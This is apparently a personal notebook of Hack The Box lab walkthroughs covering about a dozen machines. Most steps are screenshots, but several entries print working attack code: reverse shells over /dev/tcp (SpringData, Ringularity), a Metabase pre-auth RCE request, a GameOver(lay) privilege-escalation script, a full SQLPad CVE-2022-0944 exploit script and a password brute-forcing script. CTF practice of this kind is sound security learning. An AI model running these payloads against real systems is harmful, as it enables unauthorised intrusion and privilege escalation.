I'll write my walkthrough the HTB machines that I’d be doing.

---

## Very Easy Machines

### ApacheCGI ✅

The base of this machine is that is using apache 2.4.49 vulnerable to PAth traversal y RCE

> [!info] Apache HTTP Server Path Traversal & Remote Code Execution (CVE-2021-41773 & CVE-2021-42013) | Qualys Security Blog  
> On October 4, 2021, Apache HTTP Server Project released Security advisory on a Path traversal and File disclosure vulnerability in Apache HTTP Server 2.  
> [https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013](https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013)  

I used the following exploit to test if is vulnerable

![[Untitled 539.png|Untitled 539.png]]

As seen, the /icons directory is vulnerable

![[Untitled 1 5.png|Untitled 1 5.png]]

Now for this version we also have an RCE

![[Untitled 2 5.png|Untitled 2 5.png]]

![[Untitled 3 5.png|Untitled 3 5.png]]

![[Untitled 4 5.png|Untitled 4 5.png]]

Now we need the root flag

After trying so many things like enviroment variables (env), sudo -l, ps, i found some binaries that have SUID permissions

![[Untitled 5 4.png|Untitled 5 4.png]]

Using GTFO Bins I found this to leave the restricted shell, and if this works, it will spawn a shell as root

![[Untitled 6 3.png|Untitled 6 3.png]]

Using this I read the root flag

![[Untitled 7 3.png|Untitled 7 3.png]]

![[Untitled 8 3.png|Untitled 8 3.png]]

But this did not give me ROOT access

### SuperProfile ✅

![[Untitled 9 3.png|Untitled 9 3.png]]

smbclient to list available shares

![[Untitled 10 3.png|Untitled 10 3.png]]

![[Untitled 11 3.png|Untitled 11 3.png]]

![[Untitled 12 3.png|Untitled 12 3.png]]

usign systeminfo we can gather information.

![[Untitled 13 3.png|Untitled 13 3.png]]

I can see that some hot fixes are installed, I can find vulnerabilities.

![[Untitled 14 3.png|Untitled 14 3.png]]

> [!info] User Profile Arbitrary Junction Creation Local Privilege Elevation  
> Rapid7's VulnDB is curated repository of vetted computer software exploits and exploitable vulnerabilities.  
> [https://www.rapid7.com/db/modules/exploit/windows/local/cve_2022_26904_superprofile/](https://www.rapid7.com/db/modules/exploit/windows/local/cve_2022_26904_superprofile/)  

> [!info] User Profile Arbitrary Junction Creation Local Privilege Elevation - Metasploit - InfosecMatter  
> Detailed information about how to use the exploit/windows/local/cve_2022_26904_superprofile metasploit module (User Profile Arbitrary Junction Creation Local Privilege Elevation) with examples and msfconsole usage snippets.  
> [https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/windows/local/cve_2022_26904_superprofile](https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/windows/local/cve_2022_26904_superprofile)  

In this case Ill use metasploit

First i create an executable to use in the win machine

![[Untitled 15 3.png|Untitled 15 3.png]]

Now i start a HTTP server

Now using curl i download the executable

![[Untitled 16 3.png|Untitled 16 3.png]]

Once we execute this .exe and start msconsole to establish the session

![[Untitled 17 3.png|Untitled 17 3.png]]

I had to set AutoCheck false for it to work

![[Untitled 18 3.png|Untitled 18 3.png]]

  

### SpringData ✅

![[Untitled 19 3.png|Untitled 19 3.png]]

Ín the source code

![[Untitled 20 3.png|Untitled 20 3.png]]

This is the default error page of SpingBoot Framework

![[Untitled 21 3.png|Untitled 21 3.png]]

Looking for mongodb springboot vulnerability I found

> [!info] Spring Data MongoDB SpEL Expression Injection Vulnerability (CVE-2022-22980)  
> Level up your Java code and explore what Spring can do for you.  
> [https://spring.io/blog/2022/06/20/spring-data-mongodb-spel-expression-injection-vulnerability-cve-2022-22980](https://spring.io/blog/2022/06/20/spring-data-mongodb-spel-expression-injection-vulnerability-cve-2022-22980)  

If we look for a PoC or a exploit for this CVE

> [!info] Spring_cve-2022-22980/payload at main · Vulnmachines/Spring_cve-2022-22980  
> spring data mongodb remote code execution | cve-2022-22980 poc - Vulnmachines/Spring_cve-2022-22980  
> [https://github.com/Vulnmachines/Spring_cve-2022-22980/blob/main/payload](https://github.com/Vulnmachines/Spring_cve-2022-22980/blob/main/payload)  

Now with the request we intercepted in Burp lets paste the payload after we do some changes

![[Untitled 22 3.png|Untitled 22 3.png]]

![[Untitled 23 2.png|Untitled 23 2.png]]

This was not posible so ill try to create the script and then download it in the victim machine.  
Now what worked for me is that I captured the POST request of the search bar and there I injected the payload.  

Finally i have to download the script to victim’s machine i injected the RCE wget and used python server

![[Untitled 24 2.png|Untitled 24 2.png]]

DOES NOT WORKS  
This is the payload used for this exploitation of SpEL  

`T(java.lang.Runtime).getRuntime().exec("wget http://<Attacker_IP>:<PORT>/script -o /dev/shm/script")`

As seen, I'm using the temporary directory /dev/shm but is it also possible to use /tmp

This is the how I created the script binary.

```Python
cat > script <<EOF
bash -i &>/dev/tcp/10.10.14.22/7777 0>&1
EOF
```

And this is how I downloaded it to the victim’s machine. See how I am using wget and outputing the file to to /dev/shm/script

![[Untitled 25 2.png|Untitled 25 2.png]]

Then I started nc listening on port 6666 and launched the reverse shell

![[Untitled 26 2.png|Untitled 26 2.png]]

I got the flag.

![[Untitled 27 2.png|Untitled 27 2.png]]

  

### Spark ✅

![[Untitled 28 2.png|Untitled 28 2.png]]

![[Untitled 29 2.png|Untitled 29 2.png]]

![[Untitled 30 2.png|Untitled 30 2.png]]

Searching for a PoC

> [!info] GitHub - HuskyHacks/cve-2022-33891: Apache Spark Shell Command Injection Vulnerability  
> Apache Spark Shell Command Injection Vulnerability - HuskyHacks/cve-2022-33891  
> [https://github.com/HuskyHacks/cve-2022-33891?source=post_page-----7c76d0e53155--------------------------------](https://github.com/HuskyHacks/cve-2022-33891?source=post_page-----7c76d0e53155--------------------------------)  

The base is `` http://<victim>:8080/?doAs=`echo%20%22c2xlZXAgMTAK%22%20|%20base64%20-d%20|%20bash` ``

![[Untitled 31 2.png|Untitled 31 2.png]]

(I had to use sh instead of bash)

![[Untitled 32 2.png|Untitled 32 2.png]]

![[Untitled 33 2.png|Untitled 33 2.png]]

### Ringularity✅

![[Untitled 34 2.png|Untitled 34 2.png]]

It is using python

![[Untitled 35 2.png|Untitled 35 2.png]]

The file is uploaded to http://\<serverIP\>/uploads/\<filename\>

![[Untitled 36 2.png|Untitled 36 2.png]]

If we upload a script

![[Untitled 37 2.png|Untitled 37 2.png]]

If we upload this as .py the serves throws error

This (I found later) is because that we have to format the output

Final script

```Python
#!/usr/bin/python3
 
import os 
 
print("Content-type: text/html", end="\r\n\r\n", flush=True)
f = os.system("bash -c 'bash -i &>/dev/tcp/<IP>/<PORT>'")
print(f"{f}")
```

![[Untitled 38 2.png|Untitled 38 2.png]]

![[Untitled 39 2.png|Untitled 39 2.png]]

Now lets enumerate

![[Untitled 40 2.png|Untitled 40 2.png]]

The binary /usr/bin/julia is a binary for Julia Lang

[https://julialang.org/downloads/platform/](https://julialang.org/downloads/platform/)

Now the binary appears in GTFO

> [!info] julia | GTFOBins  
> It can be used to break out from restricted environments by spawning an interactive system shell.  
\> [https://gtfobins.github.io/gtfobins/julia/#suid](https://gtfobins.github.io/gtfobins/julia/#suid)  

![[Untitled 41 2.png|Untitled 41 2.png]]

![[Untitled 42 2.png|Untitled 42 2.png]]

### PwnKit ✅

Using dpkg -l I listed every package installed

![[Untitled 43 2.png|Untitled 43 2.png]]

Basically this is the famous PwnKit vuln, a vulnerable Pkexec binary to elevate privs.

I used this repo

https://github.com/arthepsy/CVE-2021-4034

Once i created the script, I started a python server to download this into the victim’s machine after i establish the reverse shell

![[Untitled 44 2.png|Untitled 44 2.png]]

Once downloaded I have to execute this

![[Untitled 45 2.png|Untitled 45 2.png]]

I had to compile the c code in my machien

![[Untitled 46 2.png|Untitled 46 2.png]]

Then I download the script again

![[Untitled 47 2.png|Untitled 47 2.png]]

In my case I had to use another binary, from this repo

[https://github.com/ly4k/PwnKit/raw/main/PwnKit](https://github.com/ly4k/PwnKit/raw/main/PwnKit)  
Since the previous needed another gcc library that the victim did not had  

![[Untitled 48 2.png|Untitled 48 2.png]]

### Prequel ✅

![[Untitled 49 2.png|Untitled 49 2.png]]

![[Untitled 50 2.png|Untitled 50 2.png]]

As we can see, default creds are in use. root:root

![[Untitled 51 2.png|Untitled 51 2.png]]

![[Untitled 52 2.png|Untitled 52 2.png]]

![[Untitled 53 2.png|Untitled 53 2.png]]

This is a my-sql SHA1 encoding

![[Untitled 54 2.png|Untitled 54 2.png]]

Using john the ripper I cracked the password

Now, the only place that I think we can use this creds in the FTP or SSH service, since there is nothing in the webpage.

![[Untitled 55 2.png|Untitled 55 2.png]]

And yes, this worked

![[Untitled 56 2.png|Untitled 56 2.png]]

We have this directory and the index.html file

This is the Apache default html file, so there is nothing there

I realized later that the directory in FTP has write permissions

![[Untitled 57 2.png|Untitled 57 2.png]]

I uploaded the creds file for test

![[Untitled 58 2.png|Untitled 58 2.png]]

And it is indeed stored in the server.

We can try for PHP code.

![[Untitled 59 2.png|Untitled 59 2.png]]

As seen, the server is not interpreting PHP

After a long time I will follow this PoC for exploiting a vulnerability that apparenttly has mariadb version 10.3.27

https://github.com/shamo0/CVE-2021-27928-POC

![[Untitled 60 2.png|Untitled 60 2.png]]

Now I need to upload this reverse shell to the server, and since I have write permissions via ftp

Once the binary is uploaded to /var/www/html/CVE..

We set this variable

And in our machine using nc listen for the conection

![[Untitled 61 2.png|Untitled 61 2.png]]

![[Untitled 62 2.png|Untitled 62 2.png]]

EN ESTE CASO MIRE WRITEUP YA QUE NO ENCTRABA NADA, AL PARECER ENUMERANDO /ETC/FSTAB SE ENCUENTRAN CREDENCIALES EN TEXTO PLANO

In the fstab file located in /etc there is plaintext credentials

![[Untitled 63 2.png|Untitled 63 2.png]]

Lara is in the system, as listed in the passwd, since i cannot change user I tried ssh

![[Untitled 64 2.png|Untitled 64 2.png]]

Here was the flag and I found that lara can excute mysql as sudo

![[Untitled 65 2.png|Untitled 65 2.png]]

Since I have the password of the root user for sql

  

### Overlay ✅

![[Untitled 66 2.png|Untitled 66 2.png]]

> [!info] NVD - CVE-2021-3493  
> NIST has updated the  
> [https://nvd.nist.gov/vuln/detail/CVE-2021-3493](https://nvd.nist.gov/vuln/detail/CVE-2021-3493)  

The reverse shell was done using FIFO **READ ABOUT THIS**

Serving a server I download the exploit in to the victims machine

![[Untitled 67 2.png|Untitled 67 2.png]]

COULD NOT FINISH THE MACHINE THE WAY THAT IS INTENDED TO, I ESCALATED USING PWNKIT FOR EXPLOITING PKEXEC VULN. I WASNT ABLE TO EXPLOIT THE OVERLAY FS VULN SINCE THE MACHINE DID NOT HAD THE NEEDED LIBRARIES

COULD NOT COMPILE NEITHER EXECUTE THE PRECOMPILED BINARY.

![[Untitled 68 2.png|Untitled 68 2.png]]

![[Untitled 69 2.png|Untitled 69 2.png]]

### Looney

> [!info] How to check glibc version on Linux  
> The GNU C library (glibc) is the GNU implementation of the standard C library.  
> [https://www.xmodulo.com/check-glibc-version-linux.html](https://www.xmodulo.com/check-glibc-version-linux.html)  

  

## Easy Machines

### Devvortex ✅

ESTUDIAR MAS ENUMERACION CMS

I start with a simple scan in NMAP

![[Untitled 70 2.png|Untitled 70 2.png]]

Found ports 22 and 80

If i try to see the webpage we are redirected to a domain, to see this domain I have to hardcode it in the /etc/hosts to be resolved

![[Untitled 71 2.png|Untitled 71 2.png]]

As per the nmap -sCV scan we have this result

![[Untitled 72 2.png|Untitled 72 2.png]]

We can see that is a ubuntu focal

![[Untitled 73 2.png|Untitled 73 2.png]]

Now we added the domain to the /etc/hosts we can see the webpage

![[Untitled 74 2.png|Untitled 74 2.png]]

Using gobuster I could not found any directories

![[Untitled 75 2.png|Untitled 75 2.png]]

Let's try some subdomains enumeration.

I'll use ffuf because gobuster is not working for me.

![[Untitled 76 2.png|Untitled 76 2.png]]

ill hide the 302 codes.

![[Untitled 77 2.png|Untitled 77 2.png]]

And I found the dev.devvortex.htb subdomain

I have to add this subdomain too to the /etc/hosts

I started another directory enumeration as there is nothing at plain sigth in the webpage

![[Untitled 78 2.png|Untitled 78 2.png]]

In the directory listing using gobuster I found some interesting paths

![[Untitled 79 2.png|Untitled 79 2.png]]

![[Untitled 80 2.png|Untitled 80 2.png]]

I found directories listed in the robots.txt

![[Untitled 81 2.png|Untitled 81 2.png]]

Also, I found manually the README.txt of Joomla CMS

![[Untitled 82 2.png|Untitled 82 2.png]]

Looking for some exploits in exploit db

![[Untitled 83 2.png|Untitled 83 2.png]]

I tried the 4.2.8 exploit for Unauthenticated Information Disclosure, this tries for a /config and a /users in the API.

![[Untitled 84 2.png|Untitled 84 2.png]]

This fetchs USERS and CONFIG, and i found credential for a super user Lewis and it password

![[Untitled 85 2.png|Untitled 85 2.png]]

![[Untitled 86 2.png|Untitled 86 2.png]]

I made this into a bash script.

![[Untitled 87 2.png|Untitled 87 2.png]]

```Bash
#!/bin/bash

# URL to fetch users /api/index.php/v1/users?public=true
# URL to fetch config /api/index.php/v1/config/application?public=true

\#Global Variables
declare -r main_url='http://dev.devvortex.htb'
declare -r config_path='/api/index.php/v1/config/application?public=true'
declare -r users_path='/api/index.php/v1/users?public=true'


\#Main
echo -e "\n [*] Obteniendo datos de usuarios en $main_url$users_path\n"
curl -s -X GET "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true" | jq '.data' | grep -E 'user|
password' | tr -d ',' | tr -d '\"'
```

Once inside the CMS we are logged in as admin.

So if I navigate to the templates, specifically **system>templates>admin templates>login.php**

![[Untitled 88 2.png|Untitled 88 2.png]]

Added the reverse shell one liner.

![[Untitled 89 2.png|Untitled 89 2.png]]

And voila

As seen early, there is a MySQL DB so lets connect with the user lewis

![[Untitled 90 2.png|Untitled 90 2.png]]

Using the DB Joomla, I found the table sd4fg_users, where I also found

![[Untitled 91 2.png|Untitled 91 2.png]]

![[Untitled 92 2.png|Untitled 92 2.png]]

Using crackstation WONT WORK

Neither hashcat worked

I had to use john the ripper and i SAW A WRITEUP

![[Untitled 93 2.png|Untitled 93 2.png]]

Once we have this password, we can log in as logan

![[Untitled 94 2.png|Untitled 94 2.png]]

And we have the user flag

We need to escalate now

Listing all commands as sudo if any

![[Untitled 95 2.png|Untitled 95 2.png]]

We can see that we have cersion 2.20.11 of this apport-cli

https://github.com/diego-tella/CVE-2023-1326-PoC

![[Untitled 96 2.png|Untitled 96 2.png]]

So looking for vulns, we have this

Lets test

So if we use the reporter with the command /usr/bin/apport-cli -f

And we use the menu until we have the option to see this report we have a VIM like tool

And we can exectute commands? If so, we are using this cli as root

![[Untitled 97 2.png|Untitled 97 2.png]]

And yes, we can

![[Untitled 98 2.png|Untitled 98 2.png]]

Machine finished root pwned hacked

  

### Analytics ✅

![[Untitled 99 2.png|Untitled 99 2.png]]

I started scaning with NMAP to found ports 22 and 80 open

![[Untitled 100 2.png|Untitled 100 2.png]]

Starting from the web I had to add the domain to /etc/hosts

![[Untitled 101 2.png|Untitled 101 2.png]]

Once inside, I can see that there is a login webpage, it redirects us to another subdomain that needs to be added to /etc/hosts

In paralel I used NMAP to scan services and try some scripts

![[Untitled 102 2.png|Untitled 102 2.png]]

Technologies of main page

![[Untitled 103 2.png|Untitled 103 2.png]]

Technologies of login page

![[Untitled 104 2.png|Untitled 104 2.png]]

This login page need a valid email, and the contact email of the domain can be found in the main page **due@analytical.com**

LEARN HOW TO USE GOBUSTER FOR SUBDOMINS IS NOT WORKING

Using ffuf I started enumerating subdomains, I know that there is one already for the Login Page

The only subdomain found was data

Since I cant find anything Ill try with metabase

So theres a PreAuth RCE vulnerabilty for metabase

> [!info] Chaining our way to Pre-Auth RCE in Metabase (CVE-2023-38646)  
> Subscribe to our newsletter and stay updated on the newest research, security advisories, and more!  
> [https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646](https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646)  

> [!info]  
>  
> [https://github.com/m3m0o/metabase-pre-auth-rce-poc/blob/main/main.py](https://github.com/m3m0o/metabase-pre-auth-rce-poc/blob/main/main.py)  

TL;DR

![[Untitled 105 2.png|Untitled 105 2.png]]

Using this POST request, where the token is found on /api/session/properties and the base64 encoded is `bash -i >&/dev/tcp/IP/PORT 0>&1`

```Bash
POST /api/setup/validate HTTP/1.1
Host: localhost
Content-Type: application/json
Content-Length: 812

{
    "token": "5491c003-41c2-482d-bab4-6e174aa1738c",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvOTk5OCAwPiYx}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}
```

![[Untitled 106 2.png|Untitled 106 2.png]]

TOKEN PoC

Now Ill use the script from [[Machines HTB]] to gain a reverse shell

![[Untitled 107 2.png|Untitled 107 2.png]]

And we have access

![[Untitled 108 2.png|Untitled 108 2.png]]

![[Untitled 109 2.png|Untitled 109 2.png]]

Enumerating the environment variables using `env` I found

![[Untitled 110 2.png|Untitled 110 2.png]]

So since I cannot use ssh within the shell, Ill try SSH

![[Untitled 111 2.png|Untitled 111 2.png]]

Once we are in using `uname -a` I searched in google for the kernel version to find a vulnerability

> [!info]  
>  
> [https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh)  

```Bash
metalytics@analytics:~$ cd ../../tmp
metalytics@analytics:/tmp$ nano exploit.sh
metalytics@analytics:/tmp$ cat exploit.sh 
#!/bin/bash

# CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation
# by g1vi https://github.com/g1vi
# October 2023

echo "[+] You should be root now"
echo "[+] Type 'exit' to finish and leave the house cleaned"

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
metalytics@analytics:/tmp$ chmod +x exploit.sh 
```

![[Untitled 112 2.png|Untitled 112 2.png]]

### Codify ✅

Some scans to see what we have

Ports 22,80,3000

The page is for testing code

![[Untitled 113 2.png|Untitled 113 2.png]]

I found that is using vm2, and doing some research in google i found that it has vulnerabilities related to RCE, and escaping the sandbox.

I found two and its PoC code.

[https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244)

[https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)

The second one for the version 3.9.17 worked for me since i executed code.

![[Untitled 114 2.png|Untitled 114 2.png]]

So, lets try to get a reverse shell.

![[Untitled 115 2.png|Untitled 115 2.png]]

![[Untitled 116 2.png|Untitled 116 2.png]]

Found a username appart from **svc** which is the one we are using.

Using ps found that pm2 is in use

![[Untitled 117 2.png|Untitled 117 2.png]]

Using pm2 which is a node.js server

![[Untitled 118 2.png|Untitled 118 2.png]]

Now if I describe what is this process doing

![[Untitled 119 2.png|Untitled 119 2.png]]

We see that is executing a `index` as cluster mode, this is why we have so many indexes.

If go to this /www directory I found that in the contact directory we have .db file

![[Untitled 120 2.png|Untitled 120 2.png]]

![[Untitled 121 2.png|Untitled 121 2.png]]

Since the shell was closing every time I made a workaround to deploy a python3 http server

![[Untitled 122 2.png|Untitled 122 2.png]]

And downloaded th .db to my machine

![[Untitled 123 2.png|Untitled 123 2.png]]

Using sqlite3

![[Untitled 124 2.png|Untitled 124 2.png]]

Using john and the rockyou dictionary

![[Untitled 125 2.png|Untitled 125 2.png]]

Now lets connect with SSH

![[Untitled 126 2.png|Untitled 126 2.png]]

Listed sudo permissions

![[Untitled 127 2.png|Untitled 127 2.png]]

This is what the script haves

![[Untitled 128 2.png|Untitled 128 2.png]]

As we can see, the script checks for a password, but this password is not in quotation marks, so it is not a string.

![[Untitled 129 2.png|Untitled 129 2.png]]

I tried entering an asterix * and the “password” worked

![[Untitled 130 2.png|Untitled 130 2.png]]

So what we can try is to test every letter

THE MACHINE WAS UNSTABLE, IT DROPS THE SSH CONNECTIONS, SO ONCE I SAW THE SCRIPT WORKED I GRABBED THE PASS AND THE ROOT FLAG FROM A WRITEUP

HTB FREE IS BULLSHIT

I had to use the script step by step

- Script
    
    ```Python
    import string
    import subprocess
    all = list(string.ascii_letters + string.digits)
    password = "kljh12k3jhaskjh12kjh3"
    found = False
    
    while not found:
        for character in all:
            command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
            output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
    
            if "Password confirmed!" in output:
                password += character
                print(password)
                break
        else:
            found = True
    ```
    

![[Untitled 131 2.png|Untitled 131 2.png]]

  

### Perfection

Starting with the enumeration

![[Untitled 132 2.png|Untitled 132 2.png]]

![[Untitled 133 2.png|Untitled 133 2.png]]

The page is about a calculator

![[Untitled 134 2.png|Untitled 134 2.png]]

![[Untitled 135 2.png|Untitled 135 2.png]]

Trying to input HTML Tag <h1></h1> it blocked my input

![[Untitled 136 2.png|Untitled 136 2.png]]

  

### Gem

Started with nmap —open but there was only port 22 exposed

So I have to try another thing, because SSH port does not seems vulnerable

Since I used -sT the port 3000 do not answered, using -sS did answered

![[Untitled 137 2.png|Untitled 137 2.png]]

![[Untitled 138 2.png|Untitled 138 2.png]]

I try and create a user with n3lairs@n3l4irs.com:test123

![[Untitled 139 2.png|Untitled 139 2.png]]

Once th account was created I noticed that the account has an ID in this case 7

![[Untitled 140 2.png|Untitled 140 2.png]]

![[Untitled 141 2.png|Untitled 141 2.png]]

![[Untitled 142 2.png|Untitled 142 2.png]]

[https://github.com/mpgn/CVE-2019-5418](https://github.com/mpgn/CVE-2019-5418)

Looking for vulnerabilities I found this CVE from the 2019 in which is describes File Disclosure

![[Untitled 143 2.png|Untitled 143 2.png]]

In the passwd file, we can see two users and its home directory, pearl and ruby

As seen, we can list its ssh private key

![[Untitled 144 2.png|Untitled 144 2.png]]

And we are in with the user ruby

![[Untitled 145 2.png|Untitled 145 2.png]]

In this case I elevated my privileges abusing PkExec vulnerabilty using PwnKit

Since the machine is created to be resolved abusing some yaml dependencies and cron Ill try this way

---

In this case, looking through payroll directories, I found some dbs

![[Untitled 146 2.png|Untitled 146 2.png]]

![[Untitled 147 2.png|Untitled 147 2.png]]

There is nothing interesting in this DB

In the dev DB there some user and hashes

![[Untitled 148 2.png|Untitled 148 2.png]]

![[Untitled 149 2.png|Untitled 149 2.png]]
### Cicada✅ 
![[Pasted image 20241124161403.png]]
Once enumerated we have this services exposed
![[Pasted image 20241124163214.png]]
Using smbclient found this 
![[Pasted image 20241124163249.png]]
Using the HR resource found this note
![[Pasted image 20241124163430.png]]
So we have a password for a user, now we can try a password spray
Then using netexec I bruteforced the usernames by RID
![[Pasted image 20241124164609.png]]
Then extracted the usernames usign `grep -oP 'CICADA\\\K[^\s(]+' smb_output.txt
 `
 ![[Pasted image 20241124164714.png]]
  Now we have users and a valid password
  ![[Pasted image 20241124165524.png]]
  The password belongs to michael.wrightson
  Enumerating users i found that david.orelious has the password as description.
  ![[Pasted image 20241124165700.png]]
  Using smbmap and the user david.orelious we have a new resource available
  ![[Pasted image 20241124170219.png]]
  ![[Pasted image 20241124170756.png]]
  I found a password inside the script, with this password I listed the resources with smbmap
  ![[Pasted image 20241124171038.png]]
  Looking through didnt found anything useful, so I used evil-winrm to get a shell
  ![[Pasted image 20241124171547.png]]
We have the user flag
![[Pasted image 20241124171732.png]]

Now we need to escalate privs, so i look at what privileges do I have as the current user
![[Pasted image 20241124172559.png]]
Using hacktricks i found some ways to exploit this
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#sebackupprivilege

And i will use this resource

https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/refs/heads/master/Privesc/Acl-FullControl.ps1

How to download a file from cmd windows
https://www.ired.team/offensive-security/defense-evasion/downloading-file-with-certutil

Remember the dot before exec an ps1
![[Pasted image 20241124173922.png]]
![[Pasted image 20241124174034.png]]
Got the root flag


### CAP ✅
#### Initial access
I started enumerating the services, I found ports 21,22 and 80 opened
Lets see what we have in the webpage
![[Pasted image 20241225185456.png]]Using gobuster didnt found any other directory
![[Pasted image 20241225191350.png]]
I also tried the FTP port but anonymous log in is disabled
One of the options of the page is a Sec snapshot, in which a 5 seconds PCAP is available to download
![[Pasted image 20241225191725.png]]
I realized that the data is labeled in the URL, so I tried to exploit IDORs
And I found the following PCAP
![[Pasted image 20241225191835.png]]Lets download the PCAP and open it with wireshark
In the PCAP we have plain creds for the user nathan in the FTP service
![[Pasted image 20241225192211.png]]
USER nathan PASS Buck3tH4TF0RM3!
and we have the user flag in the FTP server
![[Pasted image 20241225192951.png]]
![[Pasted image 20241225193005.png]]
#### Priv Esc
The same password is used for SSH, so we got a remote connection to machine
![[Pasted image 20241225193234.png]]
Did not found nothing using `find` nor `sudo -l`
I used LinPEAS so is easier, and it found some capabilities on the python3 binary
![[Pasted image 20241225200015.png]]
Using GTFOBins I found how to exploit this
![[Pasted image 20241225200113.png]]
![[Pasted image 20241225200247.png]]

### Sightless
#### Initial Access
![[Pasted image 20241225215318.png]]
The URL couldnt be resolved since is unknown![[Pasted image 20241225215353.png]]
So I had to add it to /etc/hosts
Perfect, now we can access
![[Pasted image 20241225220128.png]]
The only thing that caught my attention is this SQLPad
![[Pasted image 20241225220113.png]]
After performing some dirsearch and subdomain fuzzing I did not found anything usefull
In the SQLPad tab I found that we can provide anew connection to a database, so I tried every driver and it seems that snowflake is active and running in the victim machine
![[Pasted image 20241225222426.png]]
It seems that this does not lead anywhere
Looking through the internet for what SQLPad is I found that it has vulnerabilities associated
![[Pasted image 20241225223148.png]]
![[Pasted image 20241225223227.png]]
So I found some exploits for this version
https://github.com/0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944/blob/master/CVE-2022-0944
```bash
#!/bin/bash

# Inform the user to run netcat manually
echo "Please make sure to start a listener on your attacking machine using the command:"
echo "nc -lvnp 9001"
echo "Waiting for you to set up the listener..."

# Pause for confirmation from the user before continuing
read -p "Press [Enter] when you are ready..."

# Prompt the user for the target server and attacker's IP address
echo "Please provide the target host (e.g., x.x.com): "; read TARGET
echo "Please provide your IP address (e.g., 10.10.16.3): "; read REVERSE_IP

# Set reverse port for connection
REVERSE_PORT=9001

# Prepare the POST data with the payload injected in the 'host' and 'database' fields
POST_DATA=$(cat <<EOF
{
  "name": "divineclown",
  "driver": "mysql",
  "data": {
    "host": "",
    "database": "{{process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/$REVERSE_IP/$REVERSE_PORT 0>&1\"')}}"
  },
  "host": "",
  "database": "{{process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/$REVERSE_IP/$REVERSE_PORT 0>&1\"')}}"
}
EOF
)

# Perform the POST request using curl to trigger the payload on the target server
curl -i -s -k -X POST -H "Host: $TARGET" -H "Accept: application/json" -H "Content-Type: application/json" -H "Origin: http://$TARGET" -H "Referer: http://$TARGET/queries/new" -H "Connection: keep-alive" --data-binary "$POST_DATA" "http://$TARGET/api/test-connection" > /dev/null

echo "Exploit sent. If everything went well, check your listener for a connection on port $REVERSE_PORT."
```

Perfect, I will use this to exploit the vulnerability
![[Pasted image 20241225223931.png]]
We are in 
![[Pasted image 20241225224453.png]]
But it seems like this is a Docker container since I am root but nothing is here
![[Pasted image 20241225224554.png]]
![[Pasted image 20241225224622.png]]
This script is interesting 
![[Pasted image 20241225225632.png]]
Another thing founded was the /etc/shadow that has a user called michael 
Lets see if any of these hashes is a common password
![[Pasted image 20241225231206.png]]
Lets use hashcat 
![[Pasted image 20241225231705.png]]
Seems that this is not the proper has, so I specified another one for SHA512
![[Pasted image 20241225232130.png]]
Done! I Cracked one password
![[Pasted image 20241225233259.png]]
![[Pasted image 20241225233349.png]]
Lets try the passwords in the other services
For root in SSH did not worked
![[Pasted image 20241225233806.png]]
Good, we are in as Michael
![[Pasted image 20241225233939.png]]
#### Priv Esc
At first we do not have anything to leverage
![[Pasted image 20241225234054.png]]
We have anohter user called john
![[Pasted image 20241225234342.png]]
Using linPEAS found the following
![[Pasted image 20241225235232.png]]![[Pasted image 20241225235430.png]]
I had to seek the writeup since I was lost here
I used the ss command with the following flags
- t TCP connections
- n 
- l All lsitening sockets 
- p Check PIDs
![[Pasted image 20241226000513.png]]
A TERMINAR ES MUY DIFICIL EL PRIV ESC